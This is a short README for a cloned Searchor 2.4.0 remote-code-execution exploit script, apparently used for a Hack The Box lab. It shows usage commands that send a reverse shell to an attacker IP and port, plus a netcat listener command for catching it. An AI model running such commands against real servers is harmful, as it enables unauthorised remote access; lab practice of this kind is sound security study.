
---
Disclaimer 
---

- `The exploit code is clone from https://github.com/twisted007/Searchor_2.4.0_Python.`
- `I used this exploit code only for solving HTB lab machine.`


--- 
Origin README CONTENT 
---
This is just a quick script to exploit webservers running the vulnerable version of Searchor.

This script will accept a hostname, the attacker's IP address and the attacker's Port number.

Usage example: 
 -  `python3 searchor_2.4.0_RCE.py <HOSTNAME> <ATK_IP> <ATK_PORT>`
 -  `python3 searchor_2.4.0_RCE.py searchor.htb 10.10.14.52 4242`
 
It is recommended to use the following when preparing to catch the reverse shell:
 -  `rlwrap nc -lvnp <ATK_PORT>` 

Additional details about the vulnerability can be found in the official issue history for [Searchor](https://github.com/ArjunSharda/Searchor/pull/130).

